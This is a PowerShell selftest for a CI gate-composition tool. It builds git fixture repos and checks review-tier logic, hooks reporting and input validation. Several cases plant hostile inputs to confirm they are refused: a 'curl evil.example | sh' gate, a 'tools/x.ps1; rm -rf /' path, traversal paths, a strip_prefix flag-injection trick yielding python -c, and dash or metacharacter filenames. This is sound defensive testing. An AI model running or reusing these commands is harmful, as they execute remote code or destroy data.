# Selftest for harness_gates.py. It exits 0 (advisory) with ONE exception — an unresolvable
# changed-file scope exits non-zero with a stdout marker (ADR 0041, case Y) — so every other
# case asserts on output.
#
# The tier cases are the ones that matter: a wrong tier is invisible at runtime and buys either a
# wasted full review or — worse — a weaker review exactly where the diff is dangerous. So each tier
# branch is exercised, including the one that must WIN over size (critical surface).

$ErrorActionPreference = 'Stop'
. (Join-Path $PSScriptRoot '../lib/selftest-lib.ps1')   # assertion core, ADR 0125

$gates = Join-Path $PSScriptRoot 'harness_gates.py'
$fxBase = New-FixtureRoot 'harness-gates-selftest'
trap { Remove-FixtureRoot $fxBase; if ($null -ne $gitPathBefore) { $env:PATH = $gitPathBefore }; break }

$py = @('python', 'python3', 'py') | ForEach-Object { Get-Command $_ -ErrorAction SilentlyContinue } | Select-Object -First 1
if (-not $py) {
    if ($env:CI) {
        Write-Host 'FAIL — python absent on CI; a missing interpreter is not a pass' -ForegroundColor Red
        Remove-FixtureRoot $fxBase; exit 1
    }
    Write-Host 'SKIP [harness_gates] python absent (reported, not silent) — CI runs this gate' -ForegroundColor Yellow
    Remove-FixtureRoot $fxBase; exit 0
}

# --- spawn budget (ADR 0071 option E, third suite — 2026-09-02) ---------------------------------
# This suite is spawn-bound like init's and manifest-gate's, but the spawn is GIT, not python:
# measured per case on the owner's box, python cold start + stdlib imports is ~80 ms while each git
# call is ~60 ms — and a case pays 3 git calls inside the emitter (`diff --name-only HEAD`,
# `ls-files --others`, `diff --numstat`) plus what its fixture build pays here. So the runspace
# runner the other two suites adopted does not apply (nothing here is a .ps1 under test), and a
# persistent interpreter would recover ~18% (~8 s of 45) at the cost of a request/response driver
# that could not carry the per-run environment cases J (PYTHONIOENCODING) and K (HOME) need. Two
# levers instead — THIS header is the single owner of the measurements (spec 0008 §6 points here):
#
# (1) New-Repo spawns 3 git processes, not 5 — identity rides on the commit as `-c`, never written
#     into the fixture (two `git config` calls per fixture) and never set in this process's
#     environment. Every later fixture commit goes through Invoke-FixtureCommit for the same
#     reason: it must work where NO global identity exists — CI runners — so no site may rely on a
#     repo-local identity New-Repo used to leave behind.
# (2) On Windows the `git` on PATH is Git for Windows' cmd\git.exe, a LAUNCHER that spawns
#     mingw64\bin\git.exe and waits — two processes per call. Measured 2026-09-02 (`status` x10):
#     68 ms via the launcher, 49 ms direct. Prepending the real binary's directory reaches every
#     call this process and its children make — the emitter resolves `git` from the PATH it
#     inherits — for ~500 calls a run. Guarded on the exact layout; anything else leaves PATH alone.
#     It is the worker binary the launcher would have spawned, and it resolves the same way: checked
#     2026-09-02, both entry points print the same `--exec-path` and the same `--system` gitconfig
#     origin (`git config --system --show-origin --list`) — only the hop is gone. PATH is restored
#     at every exit (the trap and both `exit` lines) so a dot-sourced run leaves the session as it
#     found it; under `pwsh -File` (the runner's shape) the process ends anyway.
$gitPathBefore = $null
if ($IsWindows) {
    $gitCmd = (Get-Command git -ErrorAction SilentlyContinue).Source
    if ($gitCmd -and (Split-Path -Leaf (Split-Path -Parent $gitCmd)) -eq 'cmd') {
        $gitReal = Join-Path (Split-Path -Parent (Split-Path -Parent $gitCmd)) 'mingw64\bin'
        if (Test-Path -LiteralPath (Join-Path $gitReal 'git.exe') -PathType Leaf) {
            $gitPathBefore = $env:PATH
            $env:PATH = $gitReal + [IO.Path]::PathSeparator + $env:PATH
        }
    }
}
function Restore-GitPath { if ($null -ne $gitPathBefore) { $env:PATH = $gitPathBefore } }
# A fixture commit that FAILS is not a fixture: every current site's next assertion would go red
# (the file it added stays untracked and changes the diff), but the helper does not lean on that —
# a non-zero exit throws with git's own message, so the trap ends the suite as an ABORT rather
# than letting a later site with no diff-sensitive assertion read green.
function Invoke-FixtureCommit([string]$Repo, [string]$Message) {
    $gitOut = & git -C $Repo add -A 2>&1
    if ($LASTEXITCODE -ne 0) { throw "fixture add failed in ${Repo}: $($gitOut | Out-String)" }
    $gitOut = & git -C $Repo -c user.email=selftest@example.invalid -c user.name=selftest commit -q -m $Message 2>&1
    if ($LASTEXITCODE -ne 0) { throw "fixture commit '$Message' failed in ${Repo}: $($gitOut | Out-String)" }
}

$ok = $true
function Invoke-Gates([string]$Repo, [string[]]$Extra) {
    $a = @($gates, '--repo', $Repo) + $Extra
    $out = & $py.Source @a 2>&1 | Out-String
    return @{ Out = $out; Code = $LASTEXITCODE }
}
function New-Repo([string]$Name, [string]$Config, [string[]]$Files) {
    $p = Join-Path $fxBase $Name
    New-Item -ItemType Directory -Force -Path $p | Out-Null
    # .harness.json goes in BEFORE the seed commit. Writing it afterwards left it untracked, so it
    # counted as a changed file and every file-count and tier assertion was off by one — the config
    # file silently joining the diff it configures.
    if (-not [string]::IsNullOrEmpty($Config)) { Set-Content -LiteralPath (Join-Path $p '.harness.json') -Value $Config -NoNewline }
    & git -C $p init -q 2>$null
    Set-Content -LiteralPath (Join-Path $p 'seed.txt') -Value 'seed' -NoNewline
    Invoke-FixtureCommit $p 'seed'
    foreach ($f in $Files) {
        $full = Join-Path $p $f
        $dir = Split-Path -Parent $full
        if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
        Set-Content -LiteralPath $full -Value 'x' -NoNewline
    }
    return $p
}

$CFG = @'
{
  "review": {
    "canon": "REVIEW.md",
    "docs_only": ["^docs/", "^[^/]*\\.md$"],
    "harness_layer": ["^\\.harnessdir/"],
    "critical": ["^migrations/"]
  },
  "groups": [
    { "name": "api", "match": "^api/.*\\.py$", "cwd": "api", "strip_prefix": "api/", "gates": ["ruff", "pytest-nondb"] },
    { "name": "web", "match": "^web/.*\\.ts$", "cwd": "web", "strip_prefix": "web/", "gates": ["eslint", "tsc"] }
  ]
}
'@

# --- A: gate composition — files appended only for file-scoped gates ---------------------------
$a = New-Repo 'compose' $CFG @('api/app.py', 'web/main.ts')
$rA = Invoke-Gates $a @()
$ok = (Assert-True 'A exits 0 (advisory)' ($rA.Code -eq 0) "exit=$($rA.Code)") -and $ok
$ok = (Assert-True 'A file-scoped gate gets the file list, prefix stripped' ($rA.Out -match 'cd api && uv run ruff check app\.py') $rA.Out) -and $ok
$ok = (Assert-True 'A whole-program gate gets NO file list' ($rA.Out -match 'cd api && uv run pytest -m not db -q') $rA.Out) -and $ok
$ok = (Assert-True 'A whole-program gate is labelled as such' ($rA.Out -match 'whole-program: gate on slice files') $rA.Out) -and $ok
$ok = (Assert-True 'A second group composes independently' ($rA.Out -match 'cd web && npx eslint main\.ts') $rA.Out) -and $ok

# --- B: a gate outside the closed set is dropped and named -------------------------------------
$badGate = $CFG.Replace('"gates": ["ruff", "pytest-nondb"]', '"gates": ["ruff", "curl evil.example | sh"]')
$b = New-Repo 'bad-gate' $badGate @('api/app.py')
$rB = Invoke-Gates $b @()
# Emitted commands only. The WARNING legitimately echoes both the rejected value and the whole
# closed set, so a filter that keeps warn lines would fail on the very message that makes the
# rejection visible — the same distinction the verify_map selftest draws.
$runLines = @(($rB.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match 'uv run|npx|cargo|go |actionlint|curl' })
$ok = (Assert-True 'B rejects a gate outside the closed set' ($rB.Out -match "is not in the closed set") $rB.Out) -and $ok
$ok = (Assert-True 'B names the closed set' ($rB.Out -match 'ruff-format') $rB.Out) -and $ok
$ok = (Assert-True 'B the injected string never reaches an emitted command' (-not ($runLines -match 'curl')) "lines: $($runLines -join ' | ')") -and $ok
$ok = (Assert-True 'B the valid gate still emits' ($rB.Out -match 'uv run ruff check app\.py') $rB.Out) -and $ok

# --- C: files no group claims are reported, never silently ungated ------------------------------
$c = New-Repo 'ungrouped' $CFG @('api/app.py', 'weird/thing.rb')
$rC = Invoke-Gates $c @()
$ok = (Assert-True 'C ungrouped files reported' ($rC.Out -match 'ungrouped \(1 file') $rC.Out) -and $ok
$ok = (Assert-True 'C ungrouped file named' ($rC.Out -match 'weird/thing\.rb') $rC.Out) -and $ok
$ok = (Assert-True 'C says no gate covers them' ($rC.Out -match 'NO deterministic gate covers them') $rC.Out) -and $ok

# --- D: tier — docs-only earns skip ------------------------------------------------------------
$d = New-Repo 'docs-only' $CFG @('docs/a.md', 'README.md')
$rD = Invoke-Gates $d @()
$ok = (Assert-True 'D docs-only earns tier skip' ($rD.Out -match 'review tier: skip') $rD.Out) -and $ok
$ok = (Assert-True 'D skip states its reason' ($rD.Out -match 'declared docs surface') $rD.Out) -and $ok

# --- E: tier — harness-layer earns small -------------------------------------------------------
$e = New-Repo 'harness' $CFG @('.harnessdir/hook.ps1')
$rE = Invoke-Gates $e @()
$ok = (Assert-True 'E harness-layer earns tier small' ($rE.Out -match 'review tier: small') $rE.Out) -and $ok
$ok = (Assert-True 'E small states the harness reason' ($rE.Out -match 'confined to the declared harness layer') $rE.Out) -and $ok

# --- F: tier — a critical surface WINS over a small size ---------------------------------------
# One tiny file. Size alone would say small; criticality must override it.
$f = New-Repo 'critical' $CFG @('migrations/001.sql')
$rF = Invoke-Gates $f @()
$ok = (Assert-True 'F critical surface forces tier full' ($rF.Out -match 'review tier: full') $rF.Out) -and $ok
$ok = (Assert-True 'F says size never overrides criticality' ($rF.Out -match 'size never overrides criticality') $rF.Out) -and $ok
$ok = (Assert-True 'F names the critical file' ($rF.Out -match 'migrations/001\.sql') $rF.Out) -and $ok

# --- G: tier — size-based small vs full --------------------------------------------------------
$g = New-Repo 'small-size' $CFG @('api/app.py')
$rG = Invoke-Gates $g @()
$ok = (Assert-True 'G small diff earns tier small with counts' ($rG.Out -match 'review tier: small — 1 file\(s\) / \d+ changed line\(s\)') $rG.Out) -and $ok

$manyFiles = 1..7 | ForEach-Object { "api/f$_.py" }
$g2 = New-Repo 'big-size' $CFG $manyFiles
$rG2 = Invoke-Gates $g2 @()
$ok = (Assert-True 'G2 too many files earns tier full' ($rG2.Out -match 'review tier: full — 7 file\(s\)') $rG2.Out) -and $ok

# --- H: undeclared review surfaces warn rather than pretending -----------------------------------
$h = New-Repo 'no-surfaces' '{ "groups": [] }' @('api/app.py')
$rH = Invoke-Gates $h @()
$ok = (Assert-True 'H no declared surfaces warns the tier rests on size' ($rH.Out -match 'no review surfaces declared') $rH.Out) -and $ok
$ok = (Assert-True 'H still exits 0' ($rH.Code -eq 0) "exit=$($rH.Code)") -and $ok

# --- I: a missing review canon is named, not assumed -------------------------------------------
$ok = (Assert-True 'I missing review canon is called out' ($rA.Out -match 'NOT FOUND') $rA.Out) -and $ok
Set-Content -LiteralPath (Join-Path $a 'REVIEW.md') -Value '# invariants' -NoNewline
$rI = Invoke-Gates $a @()
$ok = (Assert-True 'I present review canon is not flagged' ($rI.Out -notmatch 'NOT FOUND') $rI.Out) -and $ok

# --- J: non-ASCII output survives a hostile console codepage ------------------------------------
$prevIo = $env:PYTHONIOENCODING
$env:PYTHONIOENCODING = 'cp1252'
try { $rJ = Invoke-Gates $a @() }
finally {
    if ($null -eq $prevIo) { Remove-Item Env:PYTHONIOENCODING -ErrorAction SilentlyContinue } else { $env:PYTHONIOENCODING = $prevIo }
}
$ok = (Assert-True 'J separator survives an inherited cp1252 encoding' ($rJ.Out -match '·') $rJ.Out) -and $ok
$ok = (Assert-True 'J tier reason em dash survives' ($rJ.Out -match 'review tier: \w+ — ') $rJ.Out) -and $ok

# --- K: the hooks drift report (ADR 0015) -------------------------------------------------------
# core.hooksPath is per-clone and never committed, so a repo can carry .githooks/ while THIS clone
# runs none of it. Without this line the two states are indistinguishable, which is the whole reason
# the conditional wiring in init.ps1 is not sufficient on its own.
$k = New-Repo 'hooks-report' $CFG @('api/app.py')
$rK0 = Invoke-Gates $k @()
$ok = (Assert-True 'K0 no .githooks/ means no hooks line at all' ($rK0.Out -notmatch 'hooks:') $rK0.Out) -and $ok

New-Item -ItemType Directory -Force -Path (Join-Path $k '.githooks') | Out-Null
Set-Content -LiteralPath (Join-Path $k '.githooks/pre-commit') -Value '#!/bin/sh' -NoNewline
$rK1 = Invoke-Gates $k @()
$ok = (Assert-True 'K1 unwired clone is reported' ($rK1.Out -match 'hooks: .*core\.hooksPath is UNSET') $rK1.Out) -and $ok
$ok = (Assert-True 'K1 the fix is spelled out' ($rK1.Out -match 'git config core\.hooksPath \.githooks') $rK1.Out) -and $ok
$ok = (Assert-True 'K1 still advisory (exit 0)' ($rK1.Code -eq 0) "exit=$($rK1.Code)") -and $ok

& git -C $k config --local core.hooksPath '.githooks' 2>$null
$rK2 = Invoke-Gates $k @()
$ok = (Assert-True 'K2 wired clone says so' ($rK2.Out -match 'hooks: \.githooks/ wired') $rK2.Out) -and $ok
$ok = (Assert-True 'K2 wired clone stops nagging' ($rK2.Out -notmatch 'UNSET') $rK2.Out) -and $ok

& git -C $k config --local core.hooksPath '.elsewhere' 2>$null
$rK3 = Invoke-Gates $k @()
$ok = (Assert-True 'K3 a foreign hooksPath is reported, not called wired' ($rK3.Out -match "points at '\.elsewhere'") $rK3.Out) -and $ok

# K6: the SAME directory in any other spelling is wired, not foreign. A literal compare against
# '.githooks' reported an absolute value (the canon's own clone, 2026-09-02), a './' prefix, and the
# Git-Bash-on-Windows MSYS form as "the harness hooks do not run in this clone" while they ran.
$absHooks = (Join-Path $k '.githooks')
& git -C $k config --local core.hooksPath $absHooks 2>$null
$rK6 = Invoke-Gates $k @()
$ok = (Assert-True 'K6 absolute hooksPath to .githooks is wired' ($rK6.Out -match 'hooks: \.githooks/ wired' -and $rK6.Out -notmatch 'do not run') $rK6.Out) -and $ok
& git -C $k config --local core.hooksPath './.githooks' 2>$null
$rK6b = Invoke-Gates $k @()
$ok = (Assert-True 'K6b ./.githooks is wired' ($rK6b.Out -match 'hooks: \.githooks/ wired') $rK6b.Out) -and $ok
if ($IsWindows -and $absHooks -match '^([A-Za-z]):\\(.*)$') {
    $msys = '/' + $Matches[1].ToLower() + '/' + ($Matches[2] -replace '\\', '/')
    & git -C $k config --local core.hooksPath $msys 2>$null
    $rK6c = Invoke-Gates $k @()
    $ok = (Assert-True 'K6c MSYS /c/... form is wired on Windows' ($rK6c.Out -match 'hooks: \.githooks/ wired') $rK6c.Out) -and $ok
}
# K6e: git expands `~/` in a pathname variable when it RUNS hooks, but `git config --get` returns the
# raw text — the emitter must read the value the way git applies it (`--path`), or a tilde-wired
# clone stays foreign (review 2026-09-02, medium). HOME is pinned to the fixture itself so `~/.githooks`
# resolves there on every platform (git prefers HOME over USERPROFILE on Windows too). The value MUST
# be a single-quoted literal: PowerShell tilde-expands a computed argument such as ('~/' + $x) before
# git ever sees it (measured — the stored value was already USERPROFILE-expanded), a literal survives.
$savedHome = $env:HOME
try {
    $env:HOME = $k
    & git -C $k config --local core.hooksPath '~/.githooks' 2>$null
    $rK6e = Invoke-Gates $k @()
} finally {
    if ($null -eq $savedHome) { Remove-Item Env:HOME -ErrorAction SilentlyContinue } else { $env:HOME = $savedHome }
}
$ok = (Assert-True 'K6e a ~/ hooksPath (git tilde expansion) is wired' ($rK6e.Out -match 'hooks: \.githooks/ wired') $rK6e.Out) -and $ok
& git -C $k config --local core.hooksPath (Join-Path $k '.other-hooks') 2>$null
$rK6d = Invoke-Gates $k @()
$ok = (Assert-True 'K6d an absolute path to a DIFFERENT dir stays foreign' ($rK6d.Out -match 'do not run in this clone') $rK6d.Out) -and $ok
& git -C $k config --local core.hooksPath '.elsewhere' 2>$null

# The hook's output parser stops at `review tier:`; if the hooks line ever moved above it, a
# scaffolded repo would try to execute it as a gate command.
$ok = (Assert-True 'K4 hooks line stays below the tier line' (($rK2.Out -split 'review tier:').Count -eq 2 -and ($rK2.Out -split 'review tier:')[1] -match 'hooks:') $rK2.Out) -and $ok

# K5: the executable bit is the SECOND per-checkout axis of the same gap (ADR 0056): a
# Windows-scaffolded repo commits hooks at mode 100644 and a POSIX clone silently skips them.
# POSIX-gated — Windows git invokes hooks through sh regardless of the bit, and the mode of a
# file written here IS the checkout state under test; CI's ubuntu selftest is the measurement.
if ($IsWindows) {
    Write-Host 'SKIP [K5 exec bit] Windows — git invokes hooks through sh regardless of the mode bit; CI ubuntu runs this case' -ForegroundColor Yellow
} else {
    & git -C $k config --local core.hooksPath '.githooks' 2>$null
    $rK5 = Invoke-Gates $k @()
    $ok = (Assert-True 'K5 a non-executable hook is reported with both remedies' `
        ($rK5.Out -match 'NOT executable \(pre-commit\)' -and $rK5.Out -match 'chmod \+x \.githooks/\*' -and $rK5.Out -match 'git update-index --chmod=\+x \.githooks/\*') $rK5.Out) -and $ok
    $ok = (Assert-True 'K5 still advisory (exit 0)' ($rK5.Code -eq 0) "exit=$($rK5.Code)") -and $ok
    & chmod +x (Join-Path $k '.githooks/pre-commit') 2>$null
    $rK5b = Invoke-Gates $k @()
    $ok = (Assert-True 'K5b an executable hook stops the report (wired line stays)' `
        ($rK5b.Out -notmatch 'NOT executable' -and $rK5b.Out -match 'hooks: \.githooks/ wired') $rK5b.Out) -and $ok
    # K5c: the foreign-hooksPath branch OMITS the exec-bit report — git is not consulting
    # .githooks/ there, so a chmod remedy would read as a fix that fixes nothing; the only
    # honest remedy on that branch is the hooksPath one (review 2026-08-17, medium).
    Set-Content -LiteralPath (Join-Path $k '.githooks/pre-push') -Value '#!/bin/sh' -NoNewline
    & git -C $k config --local core.hooksPath '.elsewhere' 2>$null
    $rK5c = Invoke-Gates $k @()
    $ok = (Assert-True 'K5c foreign hooksPath drops the exec-bit note (bit is irrelevant there)' `
        ($rK5c.Out -match "points at '\.elsewhere'" -and $rK5c.Out -notmatch 'NOT executable') $rK5c.Out) -and $ok
}

# --- L: script gates (ADR 0024) — closed-set runner + validated repo path ----------------------
$CFG_SCRIPT = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "ps", "match": "^tools/.*\\.ps1$", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/selftest.ps1", "files": false } ] },
    { "name": "py", "match": "^pysrc/.*\\.py$", "cwd": "pysrc", "strip_prefix": "pysrc/",
      "gates": [ { "runner": "python", "script": "pysrc/gate.py", "files": true } ] }
  ]
}
'@
$l = New-Repo 'script-gate' $CFG_SCRIPT @('tools/selftest.ps1', 'pysrc/gate.py', 'pysrc/app.py')
$rL = Invoke-Gates $l @()
$ok = (Assert-True 'L whole-program script gate composes runner template + path' ($rL.Out -match 'pwsh -NoProfile -File tools/selftest\.ps1\s+# whole-program') $rL.Out) -and $ok
$ok = (Assert-True 'L file-scoped script gate appends files, strip_prefix on script AND files' ($rL.Out -match 'cd pysrc && python gate\.py app\.py gate\.py') $rL.Out) -and $ok
$ok = (Assert-True 'L an existing script draws no missing-path warning' ($rL.Out -notmatch 'does not exist') $rL.Out) -and $ok

# --- M: script-gate validation — refused values are echoed but never composed -------------------
$CFG_BAD_SCRIPT = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "ps", "match": "^tools/", "cwd": "", "strip_prefix": "", "gates": [
      { "runner": "bash", "script": "tools/ok.ps1" },
      { "runner": "pwsh", "script": "tools/x.ps1; rm -rf /" },
      { "runner": "pwsh", "script": "/etc/evil.ps1" },
      { "runner": "pwsh", "script": "../outside.ps1" },
      { "runner": "pwsh", "script": "-oops.ps1" },
      { "runner": "pwsh", "script": "tools/*.ps1" },
      { "runner": "pwsh", "script": "tools/none.ps1" },
      { "runner": "pwsh", "script": "tools/ok.ps1" }
    ] }
  ]
}
'@
$m = New-Repo 'script-gate-bad' $CFG_BAD_SCRIPT @('tools/ok.ps1')
$rM = Invoke-Gates $m @()
# Emitted commands only — the warnings legitimately echo every refused value (same split as case B).
$mRun = @(($rM.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'M runner outside the closed set is dropped and the set named' ($rM.Out -match "script-gate runner 'bash' is not in the closed set" -and $rM.Out -match 'python-uv') $rM.Out) -and $ok
$ok = (Assert-True 'M a metacharacter path is refused and echoed in the warning' ($rM.Out -match 'rm -rf') $rM.Out) -and $ok
$ok = (Assert-True 'M no refused value reaches an emitted command' (-not ($mRun -match 'rm -rf|/etc/evil|\.\./outside|bash')) "lines: $($mRun -join ' | ')") -and $ok
$ok = (Assert-True 'M an absolute path is refused' ($rM.Out -match "'/etc/evil\.ps1' refused") $rM.Out) -and $ok
$ok = (Assert-True 'M a ''..'' path is refused' ($rM.Out -match "'\.\./outside\.ps1' refused") $rM.Out) -and $ok
$ok = (Assert-True 'M a leading-dash path is refused (a value in command position parsed as an option — case I2 class)' ($rM.Out -match "'-oops\.ps1' refused") $rM.Out) -and $ok
$ok = (Assert-True 'M a glob path is refused (CI runs sh -c without set -f)' ($rM.Out -match "'tools/\*\.ps1' refused") $rM.Out) -and $ok
$ok = (Assert-True 'M a missing script warns but the command still emits (typo must not read as coverage)' ($rM.Out -match "'tools/none\.ps1' does not exist" -and $rM.Out -match 'pwsh -NoProfile -File tools/none\.ps1') $rM.Out) -and $ok
$ok = (Assert-True 'M the valid script gate still emits' ([bool]($mRun -match 'pwsh -NoProfile -File tools/ok\.ps1')) "lines: $($mRun -join ' | ')") -and $ok

# --- N: an identical composed command emits once, deduplicated visibly --------------------------
# A whole-program script gate declared on several groups would otherwise run once per group in CI.
$CFG_DUP = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "a", "match": "^a/", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/all.ps1", "files": false } ] },
    { "name": "b", "match": "^b/", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/all.ps1", "files": false } ] }
  ]
}
'@
$n = New-Repo 'script-gate-dup' $CFG_DUP @('a/x.txt', 'b/y.txt', 'tools/all.ps1')
$rN = Invoke-Gates $n @()
$nEmit = @(($rN.Out -split "`n") | Where-Object { $_ -match '^\s{4}[^ (]' -and $_ -match 'tools/all\.ps1' })
$ok = (Assert-True 'N the duplicate command emits exactly once' ($nEmit.Count -eq 1) "emitted $($nEmit.Count)x: $($nEmit -join ' | ')") -and $ok
$ok = (Assert-True 'N the dedupe is visible, not silent' ($rN.Out -match 'already emitted above — deduplicated') $rN.Out) -and $ok
$ok = (Assert-True 'N the dedupe note is parenthesized so both output parsers skip it' ($rN.Out -match '\n    \(already emitted above') $rN.Out) -and $ok

# N2: the SAME dedupe through a closed-set SELECTOR gate. Same code path as N (`cmd in seen`
# keys on the composed string), but N proved it for script gates only — an untested twin was the
# 2026-07-29 queue's third nit, and a shared code path is an assumption until a case pins it.
$CFG_DUP2 = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "a", "match": "^a/", "cwd": "", "strip_prefix": "", "gates": ["pytest"] },
    { "name": "b", "match": "^b/", "cwd": "", "strip_prefix": "", "gates": ["pytest"] }
  ]
}
'@
$n2 = New-Repo 'selector-gate-dup' $CFG_DUP2 @('a/x.txt', 'b/y.txt')
$rN2 = Invoke-Gates $n2 @()
$n2Emit = @(($rN2.Out -split "`n") | Where-Object { $_ -match '^\s{4}[^ (]' -and $_ -match 'uv run pytest -q' })
$ok = (Assert-True 'N2 an identical selector-gate command emits exactly once' ($n2Emit.Count -eq 1) "emitted $($n2Emit.Count)x: $($n2Emit -join ' | ')") -and $ok
$ok = (Assert-True 'N2 the selector dedupe is visible, not silent' ($rN2.Out -match '\n    \(already emitted above — deduplicated: uv run pytest -q') $rN2.Out) -and $ok

# --- O: THE strip_prefix ESCAPE — validation must run on the token that becomes argv -----------
# Found by adversarial review 2026-07-29 (three independent lenses, 0 of 6 skeptics refuted), and
# invisible to cases L and M: L strips a prefix off an ordinary filename, M refuses a leading dash
# only with strip_prefix EMPTY. Combined, a declared path that passes validation composes to a bare
# interpreter flag — and with files:true the next argv token is a changed FILENAME, which
# `python -c` / `node -e` execute as source. Both consumers run emitted commands through `sh -c`.
$CFG_ESCAPE = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "evil", "match": "^payload/", "cwd": "", "strip_prefix": "payload/",
      "gates": [ { "runner": "python", "script": "payload/-c", "files": true } ] },
    { "name": "evil2", "match": "^pysrc/", "cwd": "", "strip_prefix": "pysrc/",
      "gates": [ { "runner": "node", "script": "pysrc/-e", "files": true } ] }
  ]
}
'@
$o = New-Repo 'strip-escape' $CFG_ESCAPE @('payload/harmless.py', 'pysrc/harmless.js')
$rO = Invoke-Gates $o @()
$oRun = @(($rO.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'O a path that composes to a bare flag under strip_prefix is REFUSED' ($rO.Out -match "under strip_prefix 'payload/' it composes to '-c'") $rO.Out) -and $ok
$ok = (Assert-True 'O the refusal explains the option-injection reason' ($rO.Out -match "read as an option to the runner") $rO.Out) -and $ok
$ok = (Assert-True 'O node -e is refused the same way' ($rO.Out -match "composes to '-e'") $rO.Out) -and $ok
$ok = (Assert-True 'O NO emitted command contains a bare interpreter flag' (-not ($oRun -match '(python|node)\s+-[ce](\s|$)')) "lines: $($oRun -join ' | ')") -and $ok
$ok = (Assert-True 'O the refused gates emit nothing at all, and the none-line names the refusal cause' ($rO.Out -match 'no declared group matched, matched groups declare no gates, or every declared gate was refused or skipped') $rO.Out) -and $ok

# --- P: a changed FILENAME is repo-supplied text too --------------------------------------------
# A file whose name carries a leading dash is neutralized (./-name) rather than handed over as an
# option; one carrying sh metacharacters cannot be an argument at all, so it is EXCLUDED and the
# coverage loss is stated. `sh -c` re-splits, and both output parsers truncate at '#'.
$CFG_FILES = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "src/", "gates": ["ruff"] }
  ]
}
'@
$p = New-Repo 'hostile-filenames' $CFG_FILES @('src/-rf.py', 'src/ok.py')
# Names git tracks happily and `sh -c` would re-split or truncate. Created here rather than in
# New-Repo's list so the awkward characters never pass through a Join-Path round trip.
Set-Content -LiteralPath (Join-Path $p 'src/a b.py') -Value 'x' -NoNewline
Set-Content -LiteralPath (Join-Path $p 'src/c#d.py') -Value 'x' -NoNewline
$rP = Invoke-Gates $p @()
$pRun = @(($rP.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'P a leading-dash filename is neutralized with ./, never passed bare' (($pRun -match '\./-rf\.py') -and -not ($pRun -match '(check|ruff)\s+-rf\.py')) "lines: $($pRun -join ' | ')") -and $ok
$ok = (Assert-True 'P a filename with a space is excluded from the arguments' (-not ($pRun -match 'a b\.py')) "lines: $($pRun -join ' | ')") -and $ok
$ok = (Assert-True 'P a filename with # is excluded (both parsers truncate at #)' (-not ($pRun -match 'c#d\.py')) "lines: $($pRun -join ' | ')") -and $ok
$ok = (Assert-True 'P the exclusion is reported as an ungated coverage loss' ($rP.Out -match 'EXCLUDED from this group''s gate arguments' -and $rP.Out -match 'are UNGATED') $rP.Out) -and $ok
$ok = (Assert-True 'P each excluded file is named' ($rP.Out -match 'excluded: src/a b\.py' -and $rP.Out -match 'excluded: src/c#d\.py') $rP.Out) -and $ok
$ok = (Assert-True 'P the exclusion lines are parenthesized so neither parser runs them' (($rP.Out -split "`n" | Where-Object { $_ -match 'excluded:' } | Where-Object { $_ -notmatch '^\s*\(|^\s{4}\(' }).Count -eq 0) $rP.Out) -and $ok
$ok = (Assert-True 'P the safe file is still gated' ([bool]($pRun -match 'uv run ruff check.*ok\.py')) "lines: $($pRun -join ' | ')") -and $ok
# '..' is traversal only as a path SEGMENT. A file honestly named a..b.py must stay gated —
# a substring rule here would silently ungate real files to guard against nothing.
Set-Content -LiteralPath (Join-Path $p 'src/a..b.py') -Value 'x' -NoNewline
$rP2 = Invoke-Gates $p @()
$p2Run = @(($rP2.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'P2 a dotted filename is not mistaken for traversal' ([bool]($p2Run -match 'a\.\.b\.py')) "lines: $($p2Run -join ' | ')") -and $ok
$ok = (Assert-True 'P2 it is not reported as excluded either' ($rP2.Out -notmatch 'excluded: src/a\.\.b\.py') $rP2.Out) -and $ok

# P3: the same exclusion in a group that ALSO declares a whole-program gate. "UNGATED" was an
# overstatement there (2026-07-29 queue): the whole-program gate runs regardless of the argument
# list, so only the FILE-SCOPED coverage is lost — the claim must match what actually runs.
# Case P stays the control: its group is scoped-only, so the unqualified wording still holds.
$CFG_MIXED = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "src/", "gates": ["ruff", "pytest-nondb"] }
  ]
}
'@
$p3 = New-Repo 'excluded-but-whole-covered' $CFG_MIXED @('src/ok.py')
Set-Content -LiteralPath (Join-Path $p3 'src/a b.py') -Value 'x' -NoNewline
$rP3 = Invoke-Gates $p3 @()
$ok = (Assert-True 'P3 with a whole-program gate present the exclusion is NOT called UNGATED' ($rP3.Out -notmatch 'are UNGATED') $rP3.Out) -and $ok
$ok = (Assert-True 'P3 the note says the whole-program gate still covers the excluded file' ($rP3.Out -match "whole-program gate still covers them") $rP3.Out) -and $ok
$ok = (Assert-True 'P3 the warn names the real loss — file-scoped coverage only' ($rP3.Out -match 'could not be\s+passed as file-scoped gate arguments' -and $rP3.Out -match 'rename them to restore file-scoped coverage') $rP3.Out) -and $ok
